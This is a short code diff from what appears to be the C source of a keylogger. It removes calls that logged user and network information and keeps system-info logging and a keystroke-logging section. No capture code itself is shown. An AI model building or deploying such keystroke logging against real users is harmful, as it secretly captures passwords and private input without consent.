@@ -65,12 +65,6 @@ int main( int argc, char *argv[ ] )
 	
 	// Log informations about the system
 	log_system_infos( log_file );
-	
-	// Log informations about the logged user
-	log_user_infos( log_file );
-	
-	// Log informations about the network
-	log_network_infos( log_file );
 
 	// Log the keystrokes
 	log_infos( log_file, "# Keystrokes :\n" );
